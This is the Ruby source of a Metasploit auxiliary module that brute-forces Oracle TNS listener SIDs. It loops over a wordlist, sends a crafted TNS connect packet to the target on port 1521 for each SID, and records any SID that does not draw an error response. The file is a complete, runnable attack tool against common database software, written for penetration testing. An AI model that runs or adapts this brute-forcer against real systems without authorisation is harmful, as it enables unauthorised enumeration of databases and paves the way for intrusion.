##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::TNS

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Oracle TNS Listener SID Brute Forcer',
      'Description'    => %q{
        This module simply attempts to discover the protected SID.
      },
      'Author'         => [ 'MC' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'https://www.metasploit.com/users/mc' ],
          [ 'URL' , 'http://www.red-database-security.com/scripts/sid.txt' ],
        ],
      'DisclosureDate' => 'Jan 7 2009'))

    register_options(
      [
        Opt::RPORT(1521),
        OptString.new('SLEEP', [ false,   'Sleep() amount between each request.', '1']),
        OptString.new('SIDFILE', [ false, 'The file that contains a list of sids.', File.join(Msf::Config.install_root, 'data', 'wordlists', 'sid.txt')]),
      ])

  end

  def run

    s    = datastore['SLEEP']
    list = datastore['SIDFILE']

    print_status("Starting brute force on #{rhost}, using sids from #{list}...")

    fd = ::File.open(list, 'rb').each do |sid|
      login = "(DESCRIPTION=(CONNECT_DATA=(SID=#{sid})(CID=(PROGRAM=)(HOST=MSF)(USER=)))(ADDRESS=(PROTOCOL=tcp)(HOST=#{rhost})(PORT=#{rport})))"
      pkt = tns_packet(login)

      begin
        connect
      rescue ::Interrupt
        raise $!
      rescue => e
        print_error(e.to_s)
        disconnect
        return
      end

      sock.put(pkt)
      select(nil,nil,nil,s.to_i)
      res = sock.get_once
      disconnect

      if res and res.to_s !~ /ERROR_STACK/
        report_note(
          :host => rhost,
          :port => rport,
          :type => 'oracle_sid',
          :data => "PORT=#{rport}, SID=#{sid.strip}",
          :update => :unique_data
        )
        print_good("#{rhost}:#{rport} Found SID '#{sid.strip}'")
      end

    end

    print_status("Done with brute force...")
    fd.close

  end
end
